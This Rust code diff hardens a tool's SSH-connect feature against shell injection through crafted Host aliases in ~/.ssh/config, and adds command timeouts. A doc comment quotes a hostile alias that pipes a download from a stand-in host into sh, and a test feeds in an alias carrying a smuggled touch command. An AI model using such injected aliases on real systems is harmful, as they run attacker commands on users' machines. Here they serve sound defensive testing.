@@ -13,10 +13,11 @@ use serde::Serialize;
 use super::ToolOutcome;
 
 fn run_tool(program: &str, args: &[&str]) -> Result<String, String> {
-    let out = Command::new(program)
-        .args(args)
-        .output()
-        .map_err(|e| format!("could not run {program}: {e}"))?;
+    let out = super::output_with_timeout(
+        Command::new(program).args(args),
+        super::TOOL_TIMEOUT,
+        &format!("{program} did not answer in time."),
+    )?;
     // `lsof` and `docker` both exit non-zero simply because nothing matched, so
     // stdout is worth reading either way.
     let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
@@ -216,10 +217,12 @@ fn describe_repo(path: &Path, name: &str) -> GitRepo {
 /// Separate from [`git_repos`] on purpose: this shells out to git, so it is run
 /// for the highlighted row only rather than for every repository on the disk.
 pub fn git_status(path: &str) -> Option<usize> {
-    let out = Command::new("git")
-        .args(["-C", path, "status", "--porcelain"])
-        .output()
-        .ok()?;
+    let out = super::output_with_timeout(
+        Command::new("git").args(["-C", path, "status", "--porcelain"]),
+        super::TOOL_TIMEOUT,
+        "git did not answer in time.",
+    )
+    .ok()?;
     out.status
         .success()
         .then(|| String::from_utf8_lossy(&out.stdout).lines().count())
@@ -248,6 +251,21 @@ pub fn ssh_hosts() -> Vec<SshHost> {
     parse_ssh_config(&config)
 }
 
+/// Whether an alias names a host rather than a pattern — or a shell command.
+///
+/// A `Host` line containing `*` or `?` is a rule that applies to other hosts,
+/// not somewhere to connect. Everything outside the allow-list is rejected for a
+/// second reason: [`ssh_connect`] puts the alias on a command line that
+/// Terminal hands to a shell, and `~/.ssh/config` is not necessarily the user's
+/// own writing — dotfile repos and "paste this into your SSH config" snippets
+/// are exactly how `Host a;curl${IFS}evil.sh|sh;#` would get there.
+fn alias_is_connectable(alias: &str) -> bool {
+    !alias.is_empty()
+        && alias
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
+}
+
 /// Split out from [`ssh_hosts`] so the parser is testable without a real file.
 fn parse_ssh_config(config: &str) -> Vec<SshHost> {
     let mut hosts: Vec<SshHost> = Vec::new();
@@ -266,8 +284,7 @@ fn parse_ssh_config(config: &str) -> Vec<SshHost> {
         match keyword.to_lowercase().as_str() {
             "host" => {
                 for alias in value.split_whitespace() {
-                    // A pattern is a rule, not a host you can connect to.
-                    if alias.contains('*') || alias.contains('?') || alias == "!" {
+                    if !alias_is_connectable(alias) {
                         continue;
                     }
                     hosts.push(SshHost {
@@ -420,6 +437,19 @@ Host db
     }
 
     #[test]
+    fn an_alias_a_shell_would_act_on_is_not_offered() {
+        // `${IFS}` stands in for the space `split_whitespace` would otherwise
+        // have broken this into two aliases on, so the whole thing arrives as
+        // one token and would reach Terminal's `do script` verbatim.
+        let hosts = parse_ssh_config(
+            "Host a;touch${IFS}/tmp/pwned;#\n    HostName evil.example.com\n\nHost safe\n",
+        );
+        assert_eq!(hosts.len(), 1);
+        assert_eq!(hosts[0].alias, "safe");
+        assert!(!ssh_connect("a;touch${IFS}/tmp/pwned;#").ok);
+    }
+
+    #[test]
     fn an_empty_config_yields_no_hosts() {
         assert!(parse_ssh_config("").is_empty());
         assert!(parse_ssh_config("\n\n# only comments\n").is_empty());
@@ -496,12 +526,13 @@ Host db
 
 /// Open a Terminal window connected to a configured SSH host.
 ///
-/// The alias is checked against `~/.ssh/config` before anything is run, so this
-/// cannot be used to execute an arbitrary command: the only string that reaches
-/// the shell is one the user's own config file already contains.
+/// Terminal's `do script` runs its argument as a shell command line, so the
+/// alias has to survive being re-parsed by a shell. It is checked against
+/// `~/.ssh/config` *and* against [`alias_is_connectable`], which is what keeps
+/// a hostile line in that file from becoming a hostile command line here.
 pub fn ssh_connect(alias: &str) -> ToolOutcome {
     let alias = alias.trim();
-    if !ssh_hosts().iter().any(|host| host.alias == alias) {
+    if !alias_is_connectable(alias) || !ssh_hosts().iter().any(|host| host.alias == alias) {
         return ToolOutcome::err(format!("{alias} is not a host in your SSH config."));
     }
 
